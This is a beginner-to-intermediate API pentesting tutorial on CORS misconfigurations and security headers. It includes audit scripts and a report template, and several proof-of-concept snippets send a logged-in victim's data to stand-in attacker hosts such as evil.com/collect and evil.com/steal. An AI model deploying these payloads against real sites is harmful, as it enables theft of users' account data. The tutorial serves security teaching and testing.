# CORS & API Security Headers: How Misconfigs Lead to Account Takeover

> **Series:** 30-Day API Pentesting | **Day 20** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Topic:** API Security Headers & CORS Misconfiguration

---

## Part 1: What is CORS and Why Does It Matter?

### The Same-Origin Policy — Why Browsers Block Things

Your browser has a built-in security rule: JavaScript on `evil.com` cannot read the response from `api.target.com`. This is called the **Same-Origin Policy (SOP)**.

```
evil.com JavaScript:
  fetch("https://api.target.com/user/me")   ← blocked by browser!
  
Why? Because evil.com and api.target.com have different origins.
Origin = protocol + hostname + port
  https://target.com:443  ≠  https://evil.com:443
```

Without SOP, any website could silently read your banking API, email, etc. while you browse.

### Where CORS Comes In

**CORS (Cross-Origin Resource Sharing)** is the mechanism APIs use to *selectively allow* cross-origin access. The server sends special headers saying "this origin is allowed to read my responses."

```
Normal CORS flow:

1. evil.com JS sends request to api.target.com:
   GET /api/user HTTP/1.1
   Origin: https://evil.com     ← browser adds this automatically

2. api.target.com responds:
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://myapp.com    ← only myapp.com allowed
   
3. Browser checks: "Is evil.com == myapp.com?" → NO → blocks JS from reading response

Misconfigured:
   Access-Control-Allow-Origin: https://evil.com    ← server echoed evil.com back!
   Access-Control-Allow-Credentials: true
   
Browser: "Is evil.com == evil.com?" → YES → JS can read the response → ATTACK!
```

**Critical point:** CORS is enforced by the **browser**, not the server. curl and Burp Suite ignore CORS entirely — they can always read responses. CORS only protects users visiting websites in their browser.

---

## Part 2: CORS Misconfiguration Attacks

### Attack 1: Origin Reflection (Most Common)

The server reads the `Origin` header from the request and echoes it back in `Access-Control-Allow-Origin`. This means ANY website becomes "allowed."

```bash
# Testing for origin reflection
# Send a request with an attacker-controlled Origin header
curl -s -I https://api.target.com/api/v1/user \
    -H "Origin: https://evil.com" \
    -H "Authorization: Bearer YOUR_TOKEN"

# Check response headers:
# Vulnerable:
# Access-Control-Allow-Origin: https://evil.com   ← your origin echoed back!
# Access-Control-Allow-Credentials: true          ← cookies/tokens included!
# 
# Secure:
# Access-Control-Allow-Origin: https://app.target.com  ← hardcoded legitimate origin
```

**Proof of Concept — Account Takeover via CORS:**

```html
<!-- Attacker hosts this page at https://evil.com/steal.html -->
<!-- Victim visits this page while logged into target.com -->
<!DOCTYPE html>
<html>
<body>
<script>
// Fetch victim's data using their session cookies
fetch("https://api.target.com/api/v1/user/me", {
    credentials: "include"  // sends victim's cookies automatically!
})
.then(response => response.json())
.then(data => {
    // Send stolen data to attacker's server
    fetch("https://evil.com/collect?data=" + encodeURIComponent(JSON.stringify(data)));
    
    // Or steal API tokens from response headers
    // Or perform actions: transfer money, change email, etc.
})
.catch(e => console.log(e));
</script>
</body>
</html>
```

```bash
# Severity assessment:
# ACAO: evil.com  alone (no ACAC)  → Low/Medium (unauthenticated data only)
# ACAO: evil.com + ACAC: true      → Critical (authenticated data, session theft)
```

### Attack 2: Null Origin Bypass

```bash
# Some servers allow Origin: null
curl -s -I https://api.target.com/api/v1/user \
    -H "Origin: null"

# Vulnerable response:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true

# Exploitation: Sandboxed iframes have Origin: null
# Attacker creates a sandboxed iframe → request appears as null origin
```

```html
<!-- Exploit using sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc='
<script>
fetch("https://api.target.com/api/v1/user", {credentials:"include"})
.then(r=>r.json())
.then(d=>top.location="https://evil.com/steal?d="+JSON.stringify(d));
</script>'>
</iframe>
```

### Attack 3: Subdomain Wildcard Bypass

```bash
# If server allows *.target.com:
# Find XSS vulnerability on any subdomain
# XSS on images.target.com → reads api.target.com → full account takeover

# Testing:
curl -H "Origin: https://anything.target.com" https://api.target.com/api/user -I
# If ACAO: https://anything.target.com → wildcard misconfiguration

# Also test:
curl -H "Origin: https://target.com.evil.com" https://api.target.com/api/user -I
# If ACAO: https://target.com.evil.com → regex bypass (matches /target.com$/)
```

### Attack 4: Pre-flight Bypass for Non-Simple Requests

```bash
# Simple requests (GET, POST with certain content types) don't need pre-flight
# Complex requests (with custom headers, DELETE, PUT, JSON body) trigger OPTIONS pre-flight

# Check pre-flight response:
curl -X OPTIONS https://api.target.com/api/v1/user \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: DELETE" \
    -H "Access-Control-Request-Headers: Authorization" \
    -v 2>&1 | grep -i "access-control"

# Look for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Methods: DELETE, PUT, PATCH
# Access-Control-Allow-Headers: Authorization
# → Attacker can make DELETE/PUT requests with victim's credentials!
```

---

## Part 3: Security Headers — What Should and Shouldn't Be There

### Headers That MUST Be Present

```bash
# Check all security headers with one command:
curl -s -I https://target.com/api/v1/user | grep -iE \
    "content-security|x-frame|strict-transport|x-content-type|referrer|permissions"
```

#### 1. Content-Security-Policy (CSP)

**What it does:** Tells the browser which scripts/styles/resources are allowed to load. Prevents XSS.

```
# Secure CSP:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

# Missing CSP → XSS has wider impact:
# - Attacker can load external scripts
# - Attacker can exfiltrate data anywhere
# - No restriction on iframe embedding
```

#### 2. X-Frame-Options

**What it does:** Prevents the page from being embedded in an iframe (prevents clickjacking).

```
# Secure:
X-Frame-Options: DENY           ← never embed in iframe
X-Frame-Options: SAMEORIGIN     ← only same-origin iframes

# Missing → clickjacking possible:
# Attacker creates transparent iframe over login/payment
# Victim thinks they're clicking on attacker's page
# Actually clicking on target's page underneath → CSRF / unintended actions
```

#### 3. Strict-Transport-Security (HSTS)

**What it does:** Forces browser to always use HTTPS, even if user types HTTP.

```
# Secure:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Missing → HTTPS downgrade possible:
# Public WiFi MITM → downgrade to HTTP → read all traffic
# Steal session cookies transmitted over HTTP
```

#### 4. X-Content-Type-Options

**What it does:** Prevents browser from "sniffing" the MIME type and treating files differently than declared.

```
# Secure:
X-Content-Type-Options: nosniff

# Missing → MIME confusion:
# Upload a .jpg that contains JavaScript
# Browser sniffs it as JS → executes it → XSS
```

### Headers That Must NOT Be Present

```bash
# These headers leak sensitive information — check for them:
curl -s -I https://target.com | grep -iE "server|powered|aspnet|version|debug"
```

#### 1. Server Header (Version Disclosure)

```bash
# Dangerous:
Server: Apache/2.4.49 (Ubuntu)

# What attacker does:
# searchsploit Apache 2.4.49
# → CVE-2021-41773: Path traversal + RCE
# → One command → remote code execution

# Secure:
Server: (absent or) Server: webserver
```

#### 2. X-Powered-By

```bash
# Dangerous:
X-Powered-By: Express
X-Powered-By: PHP/7.4.3
X-Powered-By: ASP.NET

# What it reveals:
# - Backend framework → known vulnerabilities
# - Exact version → targeted exploits
# - Technology stack → adaptation of attacks
```

#### 3. Debug Headers

```bash
# Dangerous (seen in staging leaked to prod):
X-Debug-Token: 3a89f2c1
X-Debug-Token-Link: /_profiler/3a89f2c1   ← Symfony profiler!
X-Query-Time: 0.043s
X-DB-Query-Count: 14

# Symfony profiler exposed → full stack traces, DB queries, environment variables
curl https://target.com/_profiler/3a89f2c1
# → credentials, SQL queries, server configuration all visible!
```

---

## Part 4: Complete Header Audit Script

```bash
#!/bin/bash
TARGET="${1:-https://target.com}"
TOKEN="${2:-}"

echo "===================================="
echo "  Security Header Audit: $TARGET"
echo "===================================="

# Fetch headers
if [ -n "$TOKEN" ]; then
    HEADERS=$(curl -s -I "$TARGET/api/v1/user" -H "Authorization: Bearer $TOKEN")
else
    HEADERS=$(curl -s -I "$TARGET")
fi

echo ""
echo "=== CORS CHECK ==="
# Test origin reflection
CORS_RESP=$(curl -s -I "$TARGET/api/v1/user" \
    -H "Origin: https://evil.com" \
    -H "Authorization: Bearer $TOKEN" 2>&1)

ACAO=$(echo "$CORS_RESP" | grep -i "access-control-allow-origin" | head -1)
ACAC=$(echo "$CORS_RESP" | grep -i "access-control-allow-credentials" | head -1)
echo "ACAO: $ACAO"
echo "ACAC: $ACAC"
if echo "$ACAO" | grep -qi "evil.com"; then
    echo "*** CRITICAL: Origin reflection detected! ***"
fi

echo ""
echo "=== MUST HAVE (checking presence) ==="
for header in "content-security-policy" "x-frame-options" \
              "strict-transport-security" "x-content-type-options"; do
    if echo "$HEADERS" | grep -qi "$header"; then
        echo "PRESENT: $header"
    else
        echo "MISSING: $header  <-- FINDING"
    fi
done

echo ""
echo "=== MUST NOT HAVE (checking absence) ==="
for header in "server" "x-powered-by" "x-aspnet-version" \
              "x-debug" "x-generator"; do
    val=$(echo "$HEADERS" | grep -i "^$header:" | head -1)
    if [ -n "$val" ]; then
        echo "EXPOSED: $val  <-- FINDING"
    else
        echo "ABSENT: $header (good)"
    fi
done

echo ""
echo "=== NULL ORIGIN CHECK ==="
NULL_RESP=$(curl -s -I "$TARGET/api/v1/user" -H "Origin: null" 2>&1)
NULL_ACAO=$(echo "$NULL_RESP" | grep -i "access-control-allow-origin" | head -1)
echo "Null Origin ACAO: $NULL_ACAO"
if echo "$NULL_ACAO" | grep -qi "null"; then
    echo "*** MEDIUM: Null origin accepted! ***"
fi
```

---

## Part 5: CORS Exploitation PoC — Full Attack Chain

```python
#!/usr/bin/env python3
"""
CORS Misconfiguration Checker
Tests for origin reflection, null origin, subdomain bypass
"""
import requests

TARGET = "https://api.target.com"
TOKEN  = "Bearer YOUR_TOKEN_HERE"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

test_origins = [
    "https://evil.com",           # direct replacement
    "null",                        # null origin
    "https://target.com.evil.com", # subdomain confusion
    "https://evil.target.com",    # attacker subdomain of target
    "https://targetxevil.com",    # regex bypass
    "https://target.com@evil.com", # @ trick
]

for origin in test_origins:
    headers = {**HEADERS, "Origin": origin}
    resp = requests.get(f"{TARGET}/api/v1/user/me", headers=headers)
    
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    acac = resp.headers.get("Access-Control-Allow-Credentials", "")
    
    if origin.lower() in acao.lower() or acao == "*":
        severity = "CRITICAL" if acac.lower() == "true" else "MEDIUM"
        print(f"[{severity}] CORS vuln with origin: {origin}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        print(f"  Response status: {resp.status_code}")
    else:
        print(f"[SAFE] Origin {origin} → ACAO: {acao}")
```

---

## Part 6: Reporting CORS Findings

### Severity Guide

| Finding | Severity |
|---------|----------|
| ACAO: evil.com + ACAC: true + authenticated API | Critical |
| ACAO: evil.com + ACAC: true + unauthenticated API | High |
| ACAO: * (wildcard) + ACAC: true | Not possible (browsers block) |
| ACAO: * (wildcard) alone | Low (unauthenticated only) |
| Null origin + ACAC: true | High |
| Missing X-Frame-Options | Low |
| Server version disclosure | Low-Medium |

### Report Template

```
Title: CORS Misconfiguration — Attacker Can Read Authenticated 
       User Data Cross-Origin (Account Takeover)

Severity: Critical

Description:
The API endpoint https://api.target.com/api/v1/user/me reflects 
any Origin header in the Access-Control-Allow-Origin response header
while also setting Access-Control-Allow-Credentials: true. This allows
any website to make authenticated cross-origin requests using the 
victim's session cookies and read the full response.

Steps to Reproduce:
1. Send authenticated request:
   GET /api/v1/user/me
   Origin: https://evil.com
   Cookie: session=VICTIM_SESSION

2. Observe response:
   Access-Control-Allow-Origin: https://evil.com
   Access-Control-Allow-Credentials: true

3. Host this HTML at evil.com:
   fetch("https://api.target.com/api/v1/user/me", {credentials:"include"})
   .then(r=>r.json()).then(d=>fetch("https://evil.com/steal?d="+JSON.stringify(d)))

4. Victim visits evil.com → their profile data sent to attacker server

Impact: Full account data theft. Can be chained to perform ATO by:
- Stealing session tokens/API keys from response
- Changing email/password using victim's session
- Accessing payment information

Remediation:
- Maintain explicit allowlist of permitted origins
- Never reflect the Origin header back verbatim  
- Validate against an exact allowlist server-side
```

---

## Checklist

```
☐  Test CORS origin reflection → OPTIONS -H "Origin: evil.com" → ACAO: evil.com?
☐  Test null origin → -H "Origin: null" → ACAO: null? → iframe bypass
☐  Check wildcard CORS → ACAO: * → unauthenticated data accessible cross-origin
☐  Verify ACAC header → ACAO + ACAC: true = Critical severity
☐  Check X-Frame-Options → missing? → clickjacking possible
☐  Check CSP → missing? → XSS has wider impact
☐  Read Server header → version → grep CVE database
☐  Read X-Powered-By → framework → targeted attacks
☐  Check HSTS → missing? → HTTP downgrade MITM possible
☐  Check debug headers → X-Debug-Token → profiler/stack trace access
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 20 of 30*
